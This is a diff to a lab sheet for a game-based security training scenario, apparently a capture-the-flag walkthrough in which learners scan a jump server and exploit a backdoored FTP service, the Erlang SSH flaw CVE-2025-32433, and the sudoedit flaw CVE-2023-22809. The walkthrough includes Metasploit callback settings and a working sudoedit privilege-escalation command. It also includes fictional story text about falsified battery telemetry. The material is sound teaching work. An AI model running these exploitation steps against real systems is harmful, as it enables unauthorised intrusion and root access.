@@ -9,7 +9,7 @@ redirect_from:
   - /labs/introducing_attacks/m04-critical-failure-vm-technical-steps/
 type: ["game-based-learning", "lab-sheet"]
 difficulty: "intermediate"
-source: "https://github.com/cliffe/BreakEscape/blob/main/scenarios/m04_critical_failure/labsheet_vm_steps.md"
+source: "https://github.com/cliffe/BreakEscape/tree/main/scenarios/m04_critical_failure"
 cybok:
   - ka: "NS"
     topic: "Network Security"
@@ -119,7 +119,7 @@ The Kali login is on the sticky note on the terminal. The jump server's address 
 <details markdown="1">
 <summary>Nudge</summary>
 
-Scan every TCP port first, then ask the open ports what they are. The web service answers with a status page for the battery racks. Read the page from top to bottom: the first flag is in it. The odd high port is a second service, and the version scan will not call it OpenSSH.
+Scan every TCP port first, then ask the open ports what they are. The web service answers with the rack-status page the control room trusts, and every bank reads NOMINAL on it. This is the falsified feed at the heart of the mission, so read it as a document first and note what it claims about the banks and the interlocks. The first flag is published on that page, at the end of the status text. The odd high port is a second service, and the version scan will not call it OpenSSH.
 
 **Learn it:** ==action: Compare the two scans== (the quick scan and the full one) and note which ports only the full scan found.
 
@@ -140,7 +140,7 @@ nmap -p- <jump-server-address>
 nmap -sV -p <open-ports> <jump-server-address>
 ```
 
-3. \==action: Open the web service== in a browser on Kali, or fetch it with `curl http://<jump-server-address>/`. \==action: Read the status page== and copy the flag it shows.
+3. \==action: Open the web service== in a browser on Kali, or fetch it with `curl http://<jump-server-address>/`. \==action: Read the status page== (the falsified rack feed), then copy the flag printed at the end of the status text.
 4. \==action: Keep the second service's port and version== for stage 4.
 
 </details>
@@ -156,7 +156,7 @@ nmap -sV -p <open-ports> <jump-server-address>
 <details markdown="1">
 <summary>Nudge</summary>
 
-The FTP server runs a build with a backdoor, the same family you met earlier in the game. Metasploit has a module for it. Once you have a shell, the transfer notes are in OptiGrid's folder, and the flag for this step is in that folder too. Agent HaX offers the ProFTPD field guide on your phone after you submit the first flag. Ask for it there.
+The FTP server runs a build with a backdoor, the same family you met earlier in the game. Metasploit has a module for it. Once you have a shell, look in the `optigrid_transfer` folder and read the file `coordination_notes`. It is a real document, the cross-cell coordination intel: it says the jump host sits between the corporate LAN and the BMS/SCADA segment, that the telemetry stays falsified while the control room trusts the feed, and that the charge-ceiling change is staged under a root-only calibration override. Read it for the plan, then take the flag printed at the end of the file. Agent HaX offers the ProFTPD field guide on your phone after you submit the first flag. Ask for it there.
 
 **Learn it:** ==action: Before you run the exploit, check the module's options==. A wrong port or a wrong callback address fails silently.
 
@@ -181,7 +181,13 @@ set LHOST <kali-address>
 set LPORT <callback-port>
 ```
 
-4. \==action: Run `exploit`==, then list the directory and open the transfer folder with `ls` and `cat`. \==action: Read the transfer notes== and copy the flag they contain.
+4. \==action: Run `exploit`==, then open the transfer folder and read the notes with `ls` and `cat`:
+
+```bash
+cat optigrid_transfer/coordination_notes
+```
+
+\==action: Read the coordination notes== as a document, then copy the flag printed at the end of the file.
 
 </details>
 
@@ -196,7 +202,7 @@ set LPORT <callback-port>
 <details markdown="1">
 <summary>Nudge</summary>
 
-The Erlang/OTP SSH daemon has a pre-authentication flaw (CVE-2025-32433). You need no username or password, and the shell you get belongs to the daemon's service account, not root. The operator notes in the OptiGrid toolkit folder hold the flag and the next step. Ask Agent HaX for the Erlang SSH guide on your phone after you submit the FTP flag.
+The Erlang/OTP SSH daemon has a pre-authentication flaw (CVE-2025-32433). You need no username or password, and the shell you get belongs to the daemon's service account, not root. In the `optigrid_toolkit` folder, read the file `operator_notes`: a document that says this jump server is the way onto Albion's control stack, that the crew left the daemon reachable on its high port as a way back in, and that the real work on the banks happens through the root calibration override. Read it, then take the flag printed at the end of the file. Ask Agent HaX for the Erlang SSH guide on your phone after you submit the FTP flag.
 
 **Learn it:** ==action: Confirm the version before you exploit it==. A patched daemon accepts the connection and does nothing.
 
@@ -235,7 +241,11 @@ hostname
 sudo -l
 ```
 
-5. \==action: Read the operator notes== in the OptiGrid toolkit folder and copy the flag.
+5. \==action: Read the operator notes== in the toolkit folder, then copy the flag printed at the end:
+
+```bash
+cat optigrid_toolkit/operator_notes
+```
 
 </details>
 
@@ -243,14 +253,14 @@ sudo -l
 
 ### Stage 5: Root with sudoedit {#hints-vm-sudo}
 
-**Where:** the foothold shell from stage 4. **Goal:** read a root-only file and find the flag in it.
+**Where:** the foothold shell from stage 4. **Goal:** read the root-only calibration-override document and find the flag in it.
 
 > Hint: Your account is not root, and the file you want is root-only. Find out exactly what your account may run under sudo before you try anything clever.
 
 <details markdown="1">
 <summary>Nudge</summary>
 
-Run `sudo -l` on the foothold. One of the permitted commands is `sudoedit`. Check the sudo version, because the flaw is in an older build. If the version is in the affected range, the rule that looks like "edit one file" can be turned into "open another file", and the editor then shows you the root-only file. The sudo field guide, offered on your phone after the FTP or Erlang flag, covers the rule listing.
+Run `sudo -l` on the foothold. One of the permitted commands is `sudoedit`. Check the sudo version, because the flaw is in an older build. If the version is in the affected range, the rule that looks like "edit one file" can be turned into "open another file", and the editor then shows you the root-only file `root_only/bms_calibration_override`. That file is a document: the BMS calibration override that replaces the safe charge ceiling on banks A, B and C with OptiGrid's profile, driving the racks past their limit while the historian still publishes NOMINAL. Read it as the real payload of the attack, then take the flag printed at the end. The sudo field guide, offered on your phone after the FTP or Erlang flag, covers the rule listing.
 
 **Learn it:** ==action: Look up the affected version range in the CVE advisory== before you try the technique. Confirming the version first tells you whether the attempt can work.
 
@@ -268,13 +278,13 @@ sudo -V | head -1
 
 The advisory for CVE-2023-22809 lists sudo from 1.8.0 up to and including 1.9.12p1 as affected.
 
-3. \==action: Open the root-only file through the editor==, pointing `EDITOR` at a permitted file you can edit and the root-only path after it. The editor must accept extra arguments, as vim does:
+3. \==action: Open the root-only file through the editor==, pointing `EDITOR` at the root-only path (`root_only/bms_calibration_override`) and running `sudoedit` on the file the rule permits. The editor must accept extra arguments, as vim does:
 
 ```bash
-EDITOR='vim -- <root-only-file>' sudoedit <file-you-may-edit>
+EDITOR='vim -- root_only/bms_calibration_override' sudoedit <file-you-may-edit>
 ```
 
-4. \==action: Read the flag== in the editor, then quit without saving. In vim, that is `:q!`.
+4. \==action: Read the calibration-override document== in the editor and copy the flag at the end, then quit without saving. In vim, that is `:q!`.
 
 </details>
 
